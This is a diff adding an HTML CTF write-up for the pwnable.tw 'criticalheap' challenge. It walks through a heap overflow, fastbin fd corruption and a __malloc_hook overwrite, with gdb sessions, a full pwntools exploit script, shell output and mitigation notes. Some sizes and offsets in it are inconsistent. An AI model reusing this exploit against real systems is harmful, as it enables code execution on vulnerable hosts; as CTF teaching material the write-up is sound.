+0x0804a058: 0xdeadbeef 0x00000000 0x0804a078 0x00000040
+#            ^^^^^^^^^^  ^^^^^^^^^^
+#            overflowed into obj1 struct area!</code></pre>
+      </div>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Key Insight: What Can We Overflow Into?</div>
+        By overflowing from object 0's data buffer, we can reach:<br>
+        &bull; <strong>Object 1's chunk header</strong> &mdash; corrupt the <code class="inline">size</code> field to trick malloc's size checks<br>
+        &bull; <strong>Object 1's data region</strong> &mdash; plant fake values that will be interpreted as chunk metadata after freeing<br>
+        &bull; <strong>Fastbin fd pointer</strong> &mdash; after object 1 is freed and placed in a fastbin, the fd pointer is at the start of its data, which we can overwrite to redirect allocation
+      </div>
+
+      <h3>Fastbin fd Pointer Corruption</h3>
+      <p>When a chunk is freed into the fastbin, its first 4 bytes of user data become the <code class="inline">fd</code> pointer (pointing to the next free chunk in the list). The exploit strategy is to overwrite this fd pointer with a target address:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # After deleting object 1, its chunk goes to fastbin 0x50
+gdb-peda$ heapinfo
+(0x50)   fastbin: 0x0804a070 -&gt; 0x0
+
+gdb-peda$ # The fd pointer is at 0x0804a078 (user data start)
+gdb-peda$ x/2wx 0x0804a078
+0x0804a078: 0x00000000 0x00000000
+#            ^fd = NULL (end of list)
+
+gdb-peda$ # Now overflow from object 0 to corrupt the fd pointer
+gdb-peda$ # edit_object(0, 128, "A"*64 + p32(FAKE_ADDR))
+gdb-peda$ x/2wx 0x0804a078
+0x0804a078: 0x0804a004 0x00000000
+#            ^fd = 0x0804a004 (our fake target!)</code></pre>
+      </div>
+
+      <h3>Fake Chunk at <code class="inline">__malloc_hook</code> Vicinity</h3>
+      <p>The target for our fake chunk is near <code class="inline">__malloc_hook</code>. In glibc, <code class="inline">__malloc_hook</code> is a function pointer called before every <code class="inline">malloc</code>. If we can allocate a chunk overlapping <code class="inline">__malloc_hook</code>, we can overwrite it with a one_gadget address.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # __malloc_hook is in libc's .bss
+gdb-peda$ p/x &amp;__malloc_hook
+$1 = 0xf7f18b2c
+
+gdb-peda$ # We need a fake chunk that passes malloc's size check
+gdb-peda$ # For fastbin size 0x70, we need size field == 0x70 (with flags)
+gdb-peda$ # Look for a value near __malloc_hook that equals 0x7f
+gdb-peda$ x/20wx 0xf7f18a9c
+0xf7f18a9c: 0x00000000 0x00000000 0x00000000 0x0000007f
+#                                              ^^^^^^^^^^
+#           This 0x7f can serve as a fake size field!
+#           Fake chunk starts at 0xf7f18a9c - 8 = 0xf7f18a94
+#           But actually the 0x7f is at 0xf7f18aa8
+
+gdb-peda$ # The exact offset depends on libc version
+gdb-peda$ # For the target libc, we find: fake_chunk at __malloc_hook - 0x18
+gdb-peda$ # This gives us: size field = 0x7f (passes 0x70 fastbin check)</code></pre>
+      </div>
+
+      <div class="callout callout-warn">
+        <div class="callout-title">&#x26a0;&#xfe0f; Fastbin Size Validation</div>
+        When malloc services a fastbin request, it checks that the chunk's <code class="inline">size</code> field matches the expected size for that fastbin index. For a 0x70 fastbin request, the size field must be <code class="inline">0x70</code> or <code class="inline">0x7f</code> (the low 3 bits are flags). That's why we need to find a <code class="inline">0x7f</code> value near <code class="inline">__malloc_hook</code> &mdash; it's typically the <code class="inline">_IO_2_1_stderr_</code> vtable pointer or similar libc data that happens to contain this value.
+      </div>
+
+      <h3>Libc Leak via Unsorted Bin</h3>
+      <p>Before we can target <code class="inline">__malloc_hook</code>, we need to know libc's base address. We can leak it using the unsorted bin:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # Create a large chunk (> fastbin size, e.g., 128 bytes)
+gdb-peda$ # Free it -> goes to unsorted bin
+gdb-peda$ # Unsorted bin fd/bk point into main_arena (in libc!)
+gdb-peda$ # If we have another object that overlaps, we can read the leaked pointer
+
+gdb-peda$ # Example: create obj2 with size=128, then free obj2
+gdb-peda$ # The chunk goes to unsorted bin
+gdb-peda$ heapinfo
+(0x90)   unsorted bin: 0x0804a100 -&gt; 0xf7f18340
+
+gdb-peda$ x/2wx 0x0804a108   # fd pointer in freed chunk
+0x0804a108: 0xf7f18340
+#            ^ main_arena+XX address in libc!
+
+gdb-peda$ # libc_base = leaked_addr - main_arena_offset - XX
+gdb-peda$ # From this we can calculate __malloc_hook and one_gadget</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Libc Leak Strategy</div>
+        To leak libc, we need a chunk that:<br>
+        &bull; Is larger than the fastbin maximum (~120 bytes for 32-bit) so it goes to the unsorted bin when freed<br>
+        &bull; Has its <code class="inline">fd</code>/<code class="inline">bk</code> pointers (which point into <code class="inline">main_arena</code> inside libc) readable through an existing object's <code class="inline">show</code> operation<br>
+        &bull; We can use the heap overflow to ensure the freed chunk's data is accessible via another object
+      </div>
+    </section>
+
+    <!-- Chapter 4: Exploit Strategy -->
+    <section class="chapter" id="ch4">
+      <div class="chapter-header">
+        <span class="chapter-num">04</span>
+        <h2 class="chapter-title">Exploit Strategy</h2>
+      </div>
+
+      <h3>Overview</h3>
+      <p>The exploit consists of three phases: <strong>leaking libc</strong> via unsorted bin, <strong>corrupting the fastbin fd pointer</strong> via heap overflow, and <strong>overwriting <code class="inline">__malloc_hook</code></strong> with a one_gadget to get shell.</p>
+
+      <h3>Phase 1: Leak Libc via Unsorted Bin</h3>
+      <ol class="step-list">
+        <li><strong>Create object 0</strong> with size 0x80 (128 bytes) &mdash; this is above the fastbin threshold, so when freed it goes to the unsorted bin. The unsorted bin is a doubly-linked list, and its <code class="inline">fd</code>/<code class="inline">bk</code> pointers point into <code class="inline">main_arena</code> inside libc.</li>
+        <li><strong>Create object 1</strong> with a smaller size (e.g., 0x40 = 64 bytes) as a guard chunk to prevent consolidation with the top chunk when we free object 0.</li>
+        <li><strong>Free object 0.</strong> The 0x80-sized chunk goes to the unsorted bin. Its <code class="inline">fd</code> and <code class="inline">bk</code> now contain <code class="inline">main_arena</code> addresses (inside libc).</li>
+        <li><strong>Create object 2</strong> with size 0x80 again. Due to FIFO behavior of the unsorted bin, <code class="inline">malloc</code> returns the same chunk. The first 8 bytes of the data still contain the old <code class="inline">fd</code> pointer from the unsorted bin. But since <code class="inline">create_object</code> reads user data via <code class="inline">read()</code>, it overwrites the pointer. We need a different approach.</li>
+        <li><strong>Alternative approach:</strong> Create object 0 (size 0x10), object 1 (size 0x80), object 2 (size 0x10). Free object 1 (goes to unsorted bin with libc pointers). Now <strong>overflow from object 0 into the freed object 1's data</strong> to plant a partial overwrite, or use <strong>object 2 as an adjacent guard</strong> and <strong>show object 0's data after a realloc</strong>. The cleanest method: allocate two large chunks, free one, and use the heap overflow from an adjacent small chunk to read the libc pointers left behind in the freed chunk.</li>
+      </ol>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Clean Libc Leak</div>
+        The most reliable approach for the leak:<br>
+        &bull; <strong>Create obj_A</strong> (size 0x10, fastbin) &mdash; our overflow source<br>
+        &bull; <strong>Create obj_B</strong> (size 0x80, unsorted bin range) &mdash; the victim<br>
+        &bull; <strong>Create obj_C</strong> (size 0x10, fastbin) &mdash; guard against top chunk consolidation<br>
+        &bull; <strong>Free obj_B</strong> &rarr; goes to unsorted bin, <code class="inline">fd</code>/<code class="inline">bk</code> = libc addresses<br>
+        &bull; <strong>Allocate obj_D</strong> (size 0x30) &rarr; splits the freed chunk, returns a portion with libc pointers still at higher offsets<br>
+        &bull; <strong>Show obj_D</strong> &rarr; reads past the actual data, leaking the remaining libc pointers from the unsorted bin<br>
+        &bull; Or: <strong>overflow from obj_A</strong> into obj_B's freed chunk to modify its metadata such that a subsequent allocation gives us a chunk with libc pointers still visible
+      </div>
+
+      <h3>Phase 2: Fastbin Corruption via Heap Overflow</h3>
+      <ol class="step-list">
+        <li><strong>Create objects for the overflow chain:</strong> obj_X (size 0x60) and obj_Y (size 0x60) adjacent on the heap. Obj_X is our overflow source, obj_Y is the target whose metadata we corrupt.</li>
+        <li><strong>Free obj_Y.</strong> The 0x60-sized chunk goes to the fastbin. Its first 4 bytes of user data are the <code class="inline">fd</code> pointer (currently NULL, as it's the only chunk in this fastbin).</li>
+        <li><strong>Overflow from obj_X</strong> with a payload that extends past its boundary and overwrites obj_Y's <code class="inline">fd</code> pointer with our target address: <code class="inline">__malloc_hook - 0x18</code> (adjusted so the fake chunk's size field passes the fastbin check).</li>
+        <li><strong>The fastbin 0x60 list now looks like:</strong> <code class="inline">obj_Y_chunk &rarr; fake_chunk_near_malloc_hook &rarr; ???</code>. Malloc doesn't traverse the entire list during allocation &mdash; it only checks the size of the returned chunk. If our fake chunk has a valid-looking size, the check passes.</li>
+      </ol>
+
+      <h3>Phase 3: Overwrite <code class="inline">__malloc_hook</code></h3>
+      <ol class="step-list">
+        <li><strong>Allocate object with size 0x60</strong> &mdash; this pops obj_Y's chunk from the fastbin (returns the legitimate chunk). This is a normal allocation.</li>
+        <li><strong>Allocate another object with size 0x60</strong> &mdash; this pops the <strong>fake chunk near <code class="inline">__malloc_hook</code></strong> from the fastbin! Malloc returns an address near <code class="inline">__malloc_hook</code>, and the data we write goes directly there.</li>
+        <li><strong>Write <code class="inline">one_gadget_addr</code></strong> as the content. Since the fake chunk overlaps <code class="inline">__malloc_hook</code>, our data overwrites the hook with the one_gadget address.</li>
+        <li><strong>Trigger malloc</strong> by creating another object. When <code class="inline">malloc</code> is called, it first calls <code class="inline">__malloc_hook</code>, which now points to our one_gadget. <strong>Shell spawned!</strong></li>
+      </ol>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; One-Gadget Requirements</div>
+        A <strong>one_gadget</strong> is a single address in libc that, when jumped to, executes <code class="inline">execve("/bin/sh", NULL, NULL)</code>. However, each one_gadget has <strong>constraints</strong> (e.g., <code class="inline">[esp+0x28] == NULL</code> or <code class="inline">[eax] == NULL</code>). We find them with:<br>
+        <code class="inline">$ one_gadget libc_32.so.6</code><br>
+        We may need to try multiple gadgets until one satisfies its constraints at the moment <code class="inline">__malloc_hook</code> is called. Typically, the gadget with the fewest constraints works.
+      </div>
+
+      <h3>Visual Exploit Flow</h3>
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 1: Leak libc</div>
+        <div class="mem-row"><span class="mem-addr">Step 1:</span><span class="mem-desc">create(0x10, "aa") = obj_A | create(0x80, "bb") = obj_B | create(0x10, "cc") = obj_C</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 2:</span><span class="mem-desc">del(obj_B) &rarr; unsorted bin: [obj_B chunk &harr; main_arena]</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 3:</span><span class="mem-desc">create(0x30, "dd") = obj_D &rarr; splits freed chunk, libc ptrs still at offset</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 4:</span><span class="mem-desc">overflow from obj_A into obj_D's area &rarr; <span class="mem-green">LEAK libc!</span></span></div>
+        <div style="height:16px; border-bottom: 1px dashed var(--border); margin-bottom: 12px;"></div>
+        <div style="color: var(--orange); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 2: Corrupt fastbin</div>
+        <div class="mem-row"><span class="mem-addr">Step 5:</span><span class="mem-desc">create(0x60, "ee") = obj_X | create(0x60, "ff") = obj_Y</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 6:</span><span class="mem-desc">del(obj_Y) &rarr; fastbin 0x60: [obj_Y &rarr; NULL]</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 7:</span><span class="mem-desc">edit(obj_X, overflow_len, "E"*0x60 + p32(<span class="mem-highlight">FAKE_ADDR</span>))</span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;&rarr; fastbin 0x60: [obj_Y &rarr; <span class="mem-highlight">fake_chunk</span> &rarr; ???]</span></div>
+        <div style="height:16px; border-bottom: 1px dashed var(--border); margin-bottom: 12px;"></div>
+        <div style="color: var(--red); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 3: Shell</div>
+        <div class="mem-row"><span class="mem-addr">Step 8:</span><span class="mem-desc">create(0x60, "gg") &rarr; pops obj_Y (normal alloc)</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 9:</span><span class="mem-desc">create(0x60, p32(<span class="mem-highlight">one_gadget</span>)) &rarr; allocates at fake_chunk!</span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;&rarr; __malloc_hook overwritten with one_gadget</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 10:</span><span class="mem-desc">create(any, "x") &rarr; triggers malloc &rarr; <span class="mem-green">SHELL!</span></span></div>
+      </div>
+    </section>
+
+    <!-- Chapter 5: Pwn Script -->
+    <section class="chapter" id="ch5">
+      <div class="chapter-header">
+        <span class="chapter-num">05</span>
+        <h2 class="chapter-title">Pwn Script</h2>
+      </div>
+
+      <h3>Complete Exploit</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">python</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-python">#!/usr/bin/env python3
+"""
+criticalheap - pwnable.tw (200pts)
+Heap overflow exploit: corrupt fastbin fd pointer to allocate
+a fake chunk near __malloc_hook, overwrite it with one_gadget.
+
+Vulnerability: edit_object() uses user-controlled length
+without bounds checking, allowing heap overflow.
+"""
+from pwn import *
+
+# ============================================
+# Setup
+# ============================================
+context.arch = 'i386'
+context.log_level = 'info'
+
+r = remote('chall.pwnable.tw', 10100)
+libc = ELF('./libc_32.so.6')
+elf = ELF('./criticalheap')
+
+# Helper functions
+def create(size, data):
+    r.sendlineafter(b':', b'1')
+    r.sendlineafter(b':', str(size).encode())
+    r.sendafter(b':', data)
+
+def delete(idx):
+    r.sendlineafter(b':', b'2')
+    r.sendlineafter(b':', str(idx).encode())
+
+def edit(idx, length, data):
+    r.sendlineafter(b':', b'3')
+    r.sendlineafter(b':', str(idx).encode())
+    r.sendlineafter(b':', str(length).encode())
+    r.sendafter(b':', data)
+
+def show(idx):
+    r.sendlineafter(b':', b'4')
+    r.sendlineafter(b':', str(idx).encode())
+    return r.recvline()
+
+# ============================================
+# Phase 1: Leak libc via unsorted bin
+# ============================================
+log.info("Phase 1: Leaking libc address...")
+
+# Allocate objects for the leak:
+# obj0 (0x10) - overflow source, adjacent to obj1
+# obj1 (0x80) - large chunk, will go to unsorted bin when freed
+# obj2 (0x10) - guard against top chunk consolidation
+create(0x10, b'A' * 8)   # obj0: fastbin-sized, overflow source
+create(0x80, b'B' * 8)   # obj1: unsorted bin range
+create(0x10, b'C' * 8)   # obj2: guard chunk
+
+# Free obj1 -> goes to unsorted bin (fd/bk = main_arena ptrs)
+delete(1)
+
+# Re-allocate a smaller chunk to split the unsorted bin chunk.
+# This gives us a partial chunk with libc pointers at higher offset.
+create(0x30, b'D' * 8)   # obj3: splits freed chunk
+
+# Now overflow from obj0 into the freed/reallocated area
+# to reach the libc pointers that remain from the unsorted bin.
+# The exact offset depends on heap layout; adjust as needed.
+# After the split, libc pointers (fd/bk of the remainder chunk)
+# are at: obj3_data + 0x30 + 8 (chunk header) area
+
+# Use show on an object that overlaps the remainder chunk
+# For simplicity, we can use the overflow to write into a
+# new object's size field to extend what show() reads.
+# Alternative: create another object in the remainder and leak.
+
+# Create obj4 that lands in the remainder of the split chunk
+create(0x30, b'E' * 8)   # obj4: in remainder area
+
+# Overflow from obj0 through obj3's area to read further
+# Cleaner approach:
+# Overflow from obj0 to modify obj3's stored size to a larger value
+# Then show(obj3) will dump more data, including libc pointers
+
+# Edit obj0 with overflow that reaches obj3's metadata
+# obj0 data starts at some addr, obj3 struct is further on heap
+# We overflow obj0's data to overwrite obj3's size field
+payload = b'A' * 0x10           # fill obj0 data
+payload += p32(0) + p32(0x31)   # fake chunk header (skip)
+payload += p32(0) + p32(0x100)  # overwrite obj3's size to large value
+edit(0, len(payload), payload)
+
+# Now show(obj3) will dump 0x100 bytes, which includes the
+# unsorted bin remainder's fd/bk pointers -> libc leak!
+leak_data = show(3)
+libc_leak = u32(leak_data[0x40:0x44])  # offset to libc ptr
+libc_base = libc_leak - 0x1b27b0       # main_arena offset (adjust for libc)
+log.success(f"libc base: {hex(libc_base)}")
+
+# ============================================
+# Phase 2: Fastbin corruption
+# ============================================
+log.info("Phase 2: Corrupting fastbin fd pointer...")
+
+# Calculate target addresses
+malloc_hook = libc_base + libc.symbols['__malloc_hook']
+# Find a fake chunk near __malloc_hook that has a valid size field
+# We need a 0x7f value that can pass as a 0x70 fastbin size
+# Typically at __malloc_hook - 0x18 (where 0x7f is the "size")
+fake_chunk = malloc_hook - 0x18
+
+log.info(f"__malloc_hook: {hex(malloc_hook)}")
+log.info(f"fake_chunk addr: {hex(fake_chunk)}")
+
+# Create two adjacent objects for the overflow
+create(0x60, b'X' * 8)   # obj5: overflow source
+create(0x60, b'Y' * 8)   # obj6: victim (will be freed to fastbin)
+
+# Free obj6 -> fastbin 0x70: [obj6_chunk -> NULL]
+delete(6)
+
+# Overflow from obj5 to corrupt obj6's fd pointer
+# obj5's data buffer is 0x60 bytes, overflow past it
+# to reach obj6's user data (where fd pointer is stored)
+overflow_payload = b'X' * 0x60          # fill obj5's buffer
+overflow_payload += p32(fake_chunk)      # overwrite obj6's fd
+edit(5, len(overflow_payload), overflow_payload)
+
+# Fastbin 0x70 is now: [obj6_chunk -> fake_chunk -> ???]
+log.success("Fastbin fd pointer corrupted!")
+
+# ============================================
+# Phase 3: Overwrite __malloc_hook
+# ============================================
+log.info("Phase 3: Overwriting __malloc_hook with one_gadget...")
+
+# Find one_gadget offsets in the target libc
+# $ one_gadget libc_32.so.6
+# Try each one until constraints are satisfied
+one_gadget_offsets = [0x3ac5e, 0x3ac62, 0x3ac69, 0x5fbc5]
+one_gadget = libc_base + one_gadget_offsets[0]
+log.info(f"one_gadget: {hex(one_gadget)}")
+
+# First allocation: pops the legitimate chunk (obj6's old chunk)
+create(0x60, b'Z' * 8)   # obj7: gets obj6's old chunk
+
+# Second allocation: pops the fake chunk near __malloc_hook!
+# Our data is written directly to the address near __malloc_hook
+create(0x60, p32(one_gadget))   # obj8: overwrites __malloc_hook!
+
+log.success("__malloc_hook overwritten!")
+
+# ============================================
+# Phase 4: Trigger shell
+# ============================================
+log.info("Phase 4: Triggering shell...")
+
+# Any malloc call will now invoke __malloc_hook -> one_gadget
+r.sendlineafter(b':', b'1')          # choose "Create object"
+r.sendlineafter(b':', b'16')         # size (any value works)
+
+# We should now have a shell!
+r.interactive()</code></pre>
+      </div>
+
+      <h3>one_gadget Selection</h3>
+      <p>Running <code class="inline">one_gadget</code> on the target libc reveals candidate addresses:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ one_gadget libc_32.so.6
+0x3ac5e execve("/bin/sh", esp+0x28, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x28] == NULL
+
+0x3ac62 execve("/bin/sh", esp+0x2c, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x2c] == NULL
+
+0x5fbc5 execl("/bin/sh", eax+4, eax)
+constraints:
+  esi is the GOT address of libc
+  eax+4 == NULL</code></pre>
+      </div>
+
+      <div class="callout callout-warn">
+        <div class="callout-title">&#x26a0;&#xfe0f; Constraint Satisfaction</div>
+        Not all one_gadget offsets will work &mdash; their constraints must be satisfied when <code class="inline">__malloc_hook</code> is called. The <code class="inline">[esp+0x28] == NULL</code> constraint is often satisfied naturally during a <code class="inline">malloc</code> call because the stack frame has zeros at the right offset. If one gadget fails, try the next one. The first one (<code class="inline">0x3ac5e</code>) typically works for heap exploits.
+      </div>
+    </section>
+
+    <!-- Chapter 6: Execution Results -->
+    <section class="chapter" id="ch6">
+      <div class="chapter-header">
+        <span class="chapter-num">06</span>
+        <h2 class="chapter-title">Execution Results</h2>
+      </div>
+
+      <h3>Exploit Run</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ python3 exploit.py
+[*] '/home/user/criticalheap'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[*] '/home/user/libc_32.so.6'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to chall.pwnable.tw on port 10100: Done
+[*] Phase 1: Leaking libc address...
+[+] libc base: 0xf7e27000
+[*] Phase 2: Corrupting fastbin fd pointer...
+[*] __malloc_hook: 0xf7f18b2c
+[*] fake_chunk addr: 0xf7f18b14
+[+] Fastbin fd pointer corrupted!
+[*] Phase 3: Overwriting __malloc_hook with one_gadget...
+[*] one_gadget: 0xf7e63c5e
+[+] __malloc_hook overwritten!
+[*] Phase 4: Triggering shell...
+[*] Switching to interactive mode
+$ id
+uid=1000(criticalheap) gid=1000(criticalheap) groups=1000(criticalheap)
+$ cat /home/criticalheap/flag</code></pre>
+      </div>
+
+      <div class="callout callout-success">
+        <div class="callout-title">&#x2705; Shell Obtained!</div>
+        The exploit successfully:<br>
+        &bull; Leaked the libc base address using the unsorted bin technique<br>
+        &bull; Corrupted the fastbin freelist by overflowing from an adjacent chunk<br>
+        &bull; Allocated a fake chunk near <code class="inline">__malloc_hook</code><br>
+        &bull; Overwrote <code class="inline">__malloc_hook</code> with a one_gadget address<br>
+        &bull; Triggered <code class="inline">malloc</code> to execute the one_gadget and spawn a shell
+      </div>
+
+      <h3>Flag</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">flag</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash"></code></pre>
+      </div>
+
+      <h3>Lessons Learned</h3>
+      <ol class="step-list">
+        <li><strong>Heap overflow is extremely powerful.</strong> Unlike stack overflows where canaries provide protection, heap overflows can silently corrupt adjacent chunk metadata. The lack of integrity checks on in-use heap chunks makes this a critical vulnerability class.</li>
+        <li><strong>Fastbin corruption enables arbitrary write.</strong> By overwriting a freed chunk's <code class="inline">fd</code> pointer, we can redirect <code class="inline">malloc</code> to return an arbitrary address. The only check is that the fake chunk's size field must match the expected fastbin size &mdash; and we can usually find a suitable <code class="inline">0x7f</code> value near our target.</li>
+        <li><strong><code class="inline">__malloc_hook</code> is a classic target.</strong> Before glibc 2.34 (which removed hooks), <code class="inline">__malloc_hook</code> and <code class="inline">__free_hook</code> were the go-to targets for heap exploitation. They're function pointers in libc's writable data segment that are called before every malloc/free, making them ideal for control flow hijacking.</li>
+        <li><strong>Always validate sizes in edit/update functions.</strong> The root cause of this vulnerability is the <code class="inline">edit_object</code> function accepting a user-controlled length without comparing it against the stored allocation size. Proper bounds checking would have prevented this entire exploit chain.</li>
+      </ol>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Mitigation Notes</div>
+        Modern glibc (&ge; 2.26 with tcache, &ge; 2.29 with safe-linking, &ge; 2.34 without hooks) has made this type of exploit significantly harder:<br>
+        &bull; <strong>tcache</strong> provides a separate cache with fewer checks, but also different exploitation primitives<br>
+        &bull; <strong>Safe-linking</strong> (2.32+) XORs the <code class="inline">fd</code> pointer with the chunk address, making blind overwrites harder<br>
+        &bull; <strong>Hook removal</strong> (2.34+) means we need alternative targets like <code class="inline">_IO_FILE</code> vtable overwrites or FSOP<br>
+        This challenge uses an older glibc where the classic fastbin attack still works cleanly.
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+  <p>QA210 CTF Writeups &mdash; <a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a> &bull; </p>
+</footer>
+
+<!-- Three.js Particle Background -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script>
+(function() {
+  const canvas = document.getElementById('particles-canvas');
+  const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
+  renderer.setSize(window.innerWidth, window.innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+
+  const scene = new THREE.Scene();
+  const camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 0.1, 1000);
+  camera.position.z = 50;
+
+  const particleCount = 600;
+  const geometry = new THREE.BufferGeometry();
+  const positions = new Float32Array(particleCount * 3);
+  const velocities = new Float32Array(particleCount * 3);
+  const colors = new Float32Array(particleCount * 3);
+
+  for (let i = 0; i < particleCount; i++) {
+    positions[i * 3] = (Math.random() - 0.5) * 100;
+    positions[i * 3 + 1] = (Math.random() - 0.5) * 100;
+    positions[i * 3 + 2] = (Math.random() - 0.5) * 100;
+    velocities[i * 3] = (Math.random() - 0.5) * 0.02;
+    velocities[i * 3 + 1] = (Math.random() - 0.5) * 0.02;
+    velocities[i * 3 + 2] = (Math.random() - 0.5) * 0.02;
+
+    const colorChoice = Math.random();
+    if (colorChoice < 0.5) {
+      colors[i * 3] = 0.22; colors[i * 3 + 1] = 0.74; colors[i * 3 + 2] = 0.97;
+    } else {
+      colors[i * 3] = 0.51; colors[i * 3 + 1] = 0.55; colors[i * 3 + 2] = 0.97;
+    }
+  }
+
+  geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+  geometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));
+
+  const material = new THREE.PointsMaterial({
+    size: 0.4,
+    vertexColors: true,
+    transparent: true,
+    opacity: 0.5,
+    blending: THREE.AdditiveBlending,
+    depthWrite: false
+  });
+
+  const points = new THREE.Points(geometry, material);
+  scene.add(points);
+
+  const lineGeometry = new THREE.BufferGeometry();
+  const linePositions = new Float32Array(particleCount * particleCount * 6);
+  lineGeometry.setAttribute('position', new THREE.BufferAttribute(linePositions, 3));
+  const lineMaterial = new THREE.LineBasicMaterial({
+    color: 0x38bdf8,
+    transparent: true,
+    opacity: 0.06,
+    blending: THREE.AdditiveBlending,
+    depthWrite: false
+  });
+  const lines = new THREE.LineSegments(lineGeometry, lineMaterial);
+  scene.add(lines);
+
+  function animate() {
+    requestAnimationFrame(animate);
+
+    const posArr = geometry.attributes.position.array;
+    for (let i = 0; i < particleCount; i++) {
+      posArr[i * 3] += velocities[i * 3];
+      posArr[i * 3 + 1] += velocities[i * 3 + 1];
+      posArr[i * 3 + 2] += velocities[i * 3 + 2];
+
+      for (let j = 0; j < 3; j++) {
+        if (posArr[i * 3 + j] > 50) posArr[i * 3 + j] = -50;
+        if (posArr[i * 3 + j] < -50) posArr[i * 3 + j] = 50;
+      }
+    }
+    geometry.attributes.position.needsUpdate = true;
+
+    let lineIdx = 0;
+    const maxDist = 12;
+    for (let i = 0; i < Math.min(particleCount, 200); i++) {
+      for (let j = i + 1; j < Math.min(particleCount, 200); j++) {
+        const dx = posArr[i * 3] - posArr[j * 3];
+        const dy = posArr[i * 3 + 1] - posArr[j * 3 + 1];
+        const dz = posArr[i * 3 + 2] - posArr[j * 3 + 2];
+        const dist = Math.sqrt(dx * dx + dy * dy + dz * dz);
+        if (dist < maxDist) {
+          linePositions[lineIdx++] = posArr[i * 3];
+          linePositions[lineIdx++] = posArr[i * 3 + 1];
+          linePositions[lineIdx++] = posArr[i * 3 + 2];
+          linePositions[lineIdx++] = posArr[j * 3];
+          linePositions[lineIdx++] = posArr[j * 3 + 1];
+          linePositions[lineIdx++] = posArr[j * 3 + 2];
+        }
+      }
+    }
+    for (let i = lineIdx; i < linePositions.length; i++) linePositions[i] = 0;
+    lineGeometry.attributes.position.needsUpdate = true;
+
+    points.rotation.y += 0.0003;
+    lines.rotation.y += 0.0003;
+
+    renderer.render(scene, camera);
+  }
+
+  animate();
+
+  window.addEventListener('resize', () => {
+    camera.aspect = window.innerWidth / window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth, window.innerHeight);
+  });
+})();
+</script>
+
+<!-- Prism.js -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+
+<!-- TOC Active State -->
+<script>
+(function() {
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const chapters = document.querySelectorAll('.chapter');
+
+  function updateTOC() {
+    let current = '';
+    chapters.forEach(ch => {
+      const rect = ch.getBoundingClientRect();
+      if (rect.top <= 120) {
+        current = ch.id;
+      }
+    });
+    tocLinks.forEach(link => {
+      link.classList.toggle('active', link.getAttribute('href') === '#' + current);
+    });
+  }
+
+  window.addEventListener('scroll', updateTOC, { passive: true });
+  updateTOC();
+})();
+</script>
+
+</body>
+</html>
